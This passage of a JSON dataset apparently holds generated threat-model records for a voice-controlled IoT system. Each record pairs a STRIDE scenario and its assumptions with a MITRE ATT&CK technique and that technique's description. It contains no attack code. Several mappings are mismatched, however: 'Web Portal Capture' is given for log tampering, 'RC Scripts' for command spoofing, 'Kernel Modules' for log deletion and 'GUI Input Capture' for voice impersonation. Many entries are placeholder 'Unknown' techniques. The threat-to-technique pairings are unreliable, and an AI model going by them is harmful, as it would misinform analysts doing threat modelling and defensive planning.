                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates server logs to remove traces of their malicious actions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has gained access to server or administrative credentials.",
                    "Role": "Attacker",
                    "Condition": "Exploiting known vulnerabilities or weak credential protection."
                },
                {
                    "Assumption": "Logs are not protected against tampering or unauthorized access.",
                    "Role": "System Administrator",
                    "Condition": "Weak access control and integrity measures for log files."
                },
                {
                    "Assumption": "There are no backup or redundancy measures for log files.",
                    "Role": "System Designer",
                    "Condition": "No off-site or redundant log storage solutions."
                }
            ],
            "Potential Impact": "Destroys key forensic data, complicates detection and response efforts, affecting system integrity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "forensic evasion",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Web Portal Capture",
                "description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)",
                "id": "attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e",
                "technique_id": "T1056.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts data between the client-side application and the server, obtaining sensitive user information.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept communication channels.",
                    "Role": "Attacker",
                    "Condition": "Exploited vulnerabilities in the network or communication protocols."
                },
                {
                    "Assumption": "Data in transit is unencrypted or weakly encrypted.",
                    "Role": "System Designer",
                    "Condition": "Lack of robust encryption mechanisms for data in transit."
                },
                {
                    "Assumption": "Sensitive information is transmitted without additional protections.",
                    "Role": "System Designer",
                    "Condition": "Sensitive data is not masked or obfuscated during transmission."
                }
            ],
            "Potential Impact": "Leads to unauthorized disclosure of sensitive information, compromising data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "communication eavesdropping",
                "unencrypted data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud service breaches expose sensitive user data stored in the cloud component.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has gained access to cloud storage or services.",
                    "Role": "Attacker",
                    "Condition": "Compromised cloud service credentials or security flaws in the cloud infrastructure."
                },
                {
                    "Assumption": "Sensitive data is not encrypted or protected adequately in cloud storage.",
                    "Role": "System Designer",
                    "Condition": "Absence of encryption for data at rest in the cloud."
                },
                {
                    "Assumption": "No proper access controls or monitoring for cloud storage are in place.",
                    "Role": "System Administrator",
                    "Condition": "Weak access controls or lack of activity monitoring and alerts."
                }
            ],
            "Potential Impact": "Results in unauthorized access to and disclosure of sensitive user data, threatening data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud breach",
                "data exposure",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits vulnerabilities in the IoT controller to gain access and retrieve sensitive information about connected devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can exploit known vulnerabilities in the IoT controller firmware.",
                    "Role": "Attacker",
                    "Condition": "IoT controller firmware is outdated or has known security flaws."
                },
                {
                    "Assumption": "Sensitive device information is stored or accessible through the IoT controller.",
                    "Role": "System Designer",
                    "Condition": "IoT controller stores or can access sensitive device configuration data."
                },
                {
                    "Assumption": "No proper security or encryption measures are in place to protect stored information.",
                    "Role": "System Designer",
                    "Condition": "Sensitive data is stored in plaintext or weakly protected."
                }
            ],
            "Potential Impact": "Could expose device configurations and usage patterns, impacting data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "device information",
                "IoT vulnerabilities",
                "sensitive data access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the voice processing server with illegitimate requests, leading to service downtime.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can generate a large number of requests to the server.",
                    "Role": "Attacker",
                    "Condition": "The attacker has the means to launch a distributed or high-volume attack."
                },
                {
                    "Assumption": "The server lacks sufficient rate limiting or request filtering mechanisms.",
                    "Role": "System Designer",
                    "Condition": "No effective rate limiting or filtering for incoming requests."
                },
                {
                    "Assumption": "The server infrastructure cannot scale to handle sudden large loads.",
                    "Role": "System Administrator",
                    "Condition": "Server resources are insufficient to handle high traffic volumes."
                }
            ],
            "Potential Impact": "Results in unavailability of voice processing services, disrupting system availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DoS attack",
                "service disruption",
                "high traffic"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious voice commands sent in rapid succession overwhelm the IoT controller, preventing it from functioning properly.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can send voice commands without restrictions.",
                    "Role": "Attacker",
                    "Condition": "No rate limiting or filtering for voice commands."
                },
                {
                    "Assumption": "The IoT controller is not designed to handle high-frequency command inputs.",
                    "Role": "System Designer",
                    "Condition": "Insufficient handling for unexpected high load in IoT controller design."
                },
                {
                    "Assumption": "No protective measures against rapid command inputs are in place.",
                    "Role": "System Designer",
                    "Condition": "Absence of mechanisms to detect and prevent rapid command inputs."
                }
            ],
            "Potential Impact": "Disrupts the functioning of connected IoT devices, impacting system availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "rapid command input",
                "IoT controller overload",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets cloud services causing it to become unresponsive, impacting the entire application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can launch attacks against cloud service infrastructure.",
                    "Role": "Attacker",
                    "Condition": "Discovered cloud service vulnerabilities or misconfigurations."
                },
                {
                    "Assumption": "Cloud services are integral to the application's functionality.",
                    "Role": "System Designer",
                    "Condition": "Dependency on cloud services for key application functions."
                },
                {
                    "Assumption": "No effective redundancies or failover strategies in place for cloud services.",
                    "Role": "System Administrator",
                    "Condition": "Absence of backup or alternate pathways in case of cloud service failure."
                }
            ],
            "Potential Impact": "Causes widespread application outages, severely impacting system availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud service attack",
                "service disruption",
                "application outage"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the client-side application to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can find and exploit a vulnerability in the client-side application.",
                    "Role": "Attacker",
                    "Condition": "Client-side application has unpatched vulnerabilities."
                },
                {
                    "Assumption": "The application does not properly segregate user privileges.",
                    "Role": "System Designer",
                    "Condition": "Absence of proper role-based access control (RBAC) mechanisms."
                },
                {
                    "Assumption": "No monitoring for unusual privilege escalation activities.",
                    "Role": "System Administrator",
                    "Condition": "Lack of auditing and alerting for privilege escalations."
                }
            ],
            "Potential Impact": "Leads to unauthorized administrative control, compromising system integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "admin control",
                "user privilege"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker manipulates the server-side application to perform unauthorized actions as a higher-privileged user.",
            "Assumptions": [
                {
                    "Assumption": "The server-side application has vulnerabilities that can be exploited.",
                    "Role": "Attacker",
                    "Condition": "Presence of misconfigurations or unpatched flaws in the server application."
                },
                {
                    "Assumption": "Inadequate controls to prevent unauthorized actions by the server application.",
                    "Role": "System Designer",
                    "Condition": "Lack of internal controls and validations in the server application."
                },
                {
                    "Assumption": "No effective monitoring and alerting mechanisms for unauthorized actions.",
                    "Role": "System Administrator",
                    "Condition": "Absence of activity logging and alerting systems."
                }
            ],
            "Potential Impact": "Compromises system integrity and confidentiality, allowing unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "server-side exploitation",
                "unauthorized actions",
                "admin privileges"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting weak security measures in IoT devices to gain control over higher-level functions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can identify and exploit IoT device vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "IoT devices have weak security measures or known vulnerabilities."
                },
                {
                    "Assumption": "The IoT controller does not properly enforce access controls.",
                    "Role": "System Designer",
                    "Condition": "Weak access control mechanisms in the IoT controller."
                },
                {
                    "Assumption": "No real-time monitoring or anomaly detection on IoT devices.",
                    "Role": "System Administrator",
                    "Condition": "Lack of monitoring and alerting for unusual IoT device activity."
                }
            ],
            "Potential Impact": "Leads to unauthorized control and actions, affecting system integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "IoT device exploitation",
                "unauthorized control",
                "device vulnerabilities"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "7",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user to send malicious voice commands.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a device with a microphone",
                    "Role": "Attacker",
                    "Condition": "The device is within voice range of the application."
                },
                {
                    "Assumption": "The attacker is able to mimic the legitimate user's voice commands",
                    "Role": "Attacker",
                    "Condition": "The attacker has recorded the user's voice or is skillful in voice imitation."
                },
                {
                    "Assumption": "The system lacks effective voice authentication mechanisms",
                    "Role": "System Designer",
                    "Condition": "The authentication relies solely on voice commands without additional verification."
                }
            ],
            "Potential Impact": "Unauthorized access and control of IoT devices or sensitive data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "voice authentication",
                "user impersonation",
                "IoT"
            ],
            "mitre_technique": {
                "name": "GUI Input Capture",
                "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
                "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
                "technique_id": "T1056.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker manipulates the IoT controller commands by pretending to be the client-side application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept or eavesdrop on network communications",
                    "Role": "Attacker",
                    "Condition": "The network is unsecured or weakly encrypted."
                },
                {
                    "Assumption": "The attacker correctly crafts commands that mimic the client-side application format",
                    "Role": "Attacker",
                    "Condition": "The command format is understood or discovered through analysis."
                },
                {
                    "Assumption": "The IoT controller does not have strong authentication mechanisms",
                    "Role": "System Designer",
                    "Condition": "Authentication is based only on the source of the command without further checks."
                }
            ],
            "Potential Impact": "Unauthorized actions by IoT devices, potential physical damage or security breaches.",
            "MITRE ATT&CK Keywords": [
                "control hijacking",
                "network spoofing",
                "fake commands",
                "IoT"
            ],
            "mitre_technique": {
                "name": "RC Scripts",
                "description": "Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system\u2019s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.\n\nAdversaries can establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.\n\nAdversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.(Citation: intezer-kaiji-malware)\n\nSeveral Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004). (Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)",
                "id": "attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211",
                "technique_id": "T1037.004"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains access to cloud services by leveraging compromised credentials.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has obtained valid credentials through phishing or other means",
                    "Role": "Attacker",
                    "Condition": "The credentials are not protected by multifactor authentication."
                },
                {
                    "Assumption": "Cloud service access is not monitored or logged effectively",
                    "Role": "System Administrator",
                    "Condition": "There is insufficient visibility into cloud service usage."
                },
                {
                    "Assumption": "The attacker can exploit the credentials without raising alarms",
                    "Role": "Attacker",
                    "Condition": "Security alerting mechanisms are insufficient or disabled."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and manipulation of cloud-stored information.",
            "MITRE ATT&CK Keywords": [
                "credential theft",
                "cloud services",
                "unauthorized access",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware of an IoT device to alter its behavior maliciously.",
            "Assumptions": [
                {
                    "Assumption": "The firmware is vulnerable to tampering",
                    "Role": "Attacker",
                    "Condition": "The firmware has known weaknesses or lacks security protections."
                },
                {
                    "Assumption": "The attacker has physical or remote access to the IoT device",
                    "Role": "Attacker",
                    "Condition": "The device is in an unsecured location or is remotely accessible."
                },
                {
                    "Assumption": "The system does not verify firmware integrity",
                    "Role": "System Designer",
                    "Condition": "Firmware updates and integrity checks are not enforced."
                }
            ],
            "Potential Impact": "Data integrity loss, unauthorized actions by compromised IoT devices.",
            "MITRE ATT&CK Keywords": [
                "firmware modification",
                "device tampering",
                "integrity loss",
                "IoT"
            ],
            "mitre_technique": {
                "name": "RC Scripts",
                "description": "Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system\u2019s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.\n\nAdversaries can establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.\n\nAdversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.(Citation: intezer-kaiji-malware)\n\nSeveral Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004). (Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)",
                "id": "attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211",
                "technique_id": "T1037.004"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters command payloads in transit between client-side and server-side applications.",
            "Assumptions": [
                {
                    "Assumption": "Non-encrypted communication channels are used",
                    "Role": "System Designer",
                    "Condition": "Data is transmitted in plain text over the network."
                },
                {
                    "Assumption": "The attacker can intercept and modify network traffic",
                    "Role": "Attacker",
                    "Condition": "The attacker has network access through MiTM techniques."
                },
                {
                    "Assumption": "No end-to-end integrity verification is implemented",
                    "Role": "System Designer",
                    "Condition": "Message integrity is not checked upon receipt."
                }
            ],
            "Potential Impact": "Corrupted data leading to incorrect actions by the server or IoT devices.",
            "MITRE ATT&CK Keywords": [
                "payload tampering",
                "man-in-the-middle attack",
                "data corruption",
                "IoT"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker physically manipulates the microphone or speaker hardware to alter captured or outputted audio.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the microphone or speaker",
                    "Role": "Attacker",
                    "Condition": "The devices are in an unsecured or public space."
                },
                {
                    "Assumption": "Microphone and speaker hardware lacks tamper detection",
                    "Role": "System Designer",
                    "Condition": "The devices do not have anti-tampering hardware."
                },
                {
                    "Assumption": "No immediate verification of audio commands or responses is possible",
                    "Role": "User",
                    "Condition": "The users cannot discern tampered hardware in real-time."
                }
            ],
            "Potential Impact": "Faulty command capture, misleading or harmful audio feedback.",
            "MITRE ATT&CK Keywords": [
                "hardware tampering",
                "audio manipulation",
                "physical interference",
                "IoT"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious user denies having issued certain voice commands by exploiting weak logging mechanisms.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging of voice command transactions",
                    "Role": "System Designer",
                    "Condition": "Log files do not capture detailed command metadata."
                },
                {
                    "Assumption": "Logs are not securely maintained",
                    "Role": "System Administrator",
                    "Condition": "Log files can be easily altered or deleted."
                },
                {
                    "Assumption": "There is no robust audit trail or authentication for voice commands",
                    "Role": "System Designer",
                    "Condition": "Command history lacks non-repudiation features."
                }
            ],
            "Potential Impact": "Inability to prove user actions, possibility of evading accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "audit evasion",
                "voice commands"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes or modifies logs on the server-side to cover tracks after unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has elevated privileges on the server",
                    "Role": "Attacker",
                    "Condition": "The attacker exploited a vulnerability or used stolen credentials."
                },
                {
                    "Assumption": "Server-side logging and monitoring are weak",
                    "Role": "System Administrator",
                    "Condition": "Logs are not write-protected or redundantly stored."
                },
                {
                    "Assumption": "No real-time alerting on log changes",
                    "Role": "System Designer",
                    "Condition": "Log alterations do not trigger security alerts."
                }
            ],
            "Potential Impact": "Obfuscation of malicious activities, difficulty in incident response.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "covering tracks",
                "server manipulation",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious insider manipulates cloud-stored data to dispute actions taken through the IoT system.",
            "Assumptions": [
                {
                    "Assumption": "The insider has access to cloud services and data",
                    "Role": "Insider",
                    "Condition": "The individual is authorized to interact with cloud services."
                },
                {
                    "Assumption": "Cloud services lack comprehensive audit trails",
                    "Role": "System Designer",
                    "Condition": "Access and actions are not thoroughly logged or monitored."
                },
                {
                    "Assumption": "There are no integrity checks for cloud data",
                    "Role": "System Designer",
                    "Condition": "Data integrity mechanisms are not in place."
                }
            ],
            "Potential Impact": "Tampering with cloud data logs, compromising data integrity and accountability.",
            "MITRE ATT&CK Keywords": [
                "cloud manipulation",
                "data tampering",
                "insider threat",
                "audit trail"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts voice commands or responses during transmission.",
            "Assumptions": [
                {
                    "Assumption": "Communications are transmitted over unsecured channels",
                    "Role": "System Designer",
                    "Condition": "Sensitive data is sent in plain text."
                },
                {
                    "Assumption": "The attacker can access network traffic",
                    "Role": "Attacker",
                    "Condition": "The attacker is on the same network or can perform MiTM attacks."
                },
                {
                    "Assumption": "Lack of encryption can be exploited",
                    "Role": "Attacker",
                    "Condition": "The system does not enforce strong encryption standards."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information and commands.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network eavesdropping",
                "unencrypted transmission",
                "privacy breach"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive user data stored in cloud services is accessed by unauthorized entities due to misconfigurations.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service configurations are mismanaged",
                    "Role": "System Administrator",
                    "Condition": "Security settings are improperly applied or left default."
                },
                {
                    "Assumption": "Data is not properly encrypted at rest",
                    "Role": "System Designer",
                    "Condition": "Sensitive data is stored without strong encryption."
                },
                {
                    "Assumption": "Unauthorized users can gain access",
                    "Role": "Attacker",
                    "Condition": "Misconfigurations permit access to unauthorized parties."
                }
            ],
            "Potential Impact": "Exposure of personally identifiable information and other sensitive data.",
            "MITRE ATT&CK Keywords": [
                "cloud misconfiguration",
                "data breach",
                "unauthorized access",
                "PII"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
